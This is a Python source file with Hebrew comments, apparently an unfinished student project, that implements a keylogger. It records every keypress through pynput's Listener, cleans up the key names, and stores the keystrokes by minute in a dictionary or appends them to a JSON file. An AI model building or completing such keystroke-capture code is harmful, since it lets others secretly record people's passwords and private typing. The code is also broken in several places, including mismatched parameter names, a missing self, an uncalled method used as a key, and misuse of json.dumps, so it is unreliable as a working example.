from abc import ABC,abstractmethod
from pynput.keyboard import Key,Listener
import sys
from datetime import datetime
from json import dumps

# קלאס שאחראי על ההקלטה מפעיל הקלטה בהדלקה ראשונה
class KeyLogger:
    def __init__(self):
        # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
        def __on_press(Key):
            key_nise = self.nurmal_key(key)
            (key_nise)

        def on_release(key):
            try:
                if key.char == '\x04':  # Ctrl+D
                    print("Exiting...")
                    sys.exit(0)
            except AttributeError:
                pass

#  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
        with Listener(on_press=__on_press, on_release=on_release) as listener:
            listener.join()

    # אחראי ליפות את המקש
    def nurmal_key(key):
            key_nise = str(key)
            key_list = list(key_nise)
            if len(key_list) > 3:
                key_nise = ""
                for i in key_list[4:]:
                    key_nise += i
                key_nise = " " + key_nise + " "
                if key_nise == " space ":
                    return " "
                # if key_nise == " enter ":
                #     return "\n"
                # זה מוכן למקרה שהרצה לעשות שימוש במקשים מיוחדים
                return key_nise
            else:
                return key_list[1]




#  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
class IWriter(ABC):
    @abstractmethod
    def write(data: str) -> None:
        pass

# מחלקת כתיבה למילון
class DictWriter(IWriter):

    def __init__(self):
        self.dct = {}

    @staticmethod
    def cur_min():
        return datetime.now().strftime("%d/%m/%Y, %H:%M")

    def write(self, key: str) -> None:
        if self.cur_min not in self.dct:
            self.dct[self.cur_min] = key
        else:
            self.dct[self.cur_min] += key
        
# json מחלקת כתיבה לקובץ 
class FileWriter(IWriter):

    def __init__(self):        
        self.file_path = ""

    def add_file_path(self, path: str) -> None:
        self.file_path = path

    def write(self, data: str) -> None:
        with open(self.file_path, "a") as file:
            dumps(data, file)


        
class Manager:
    pass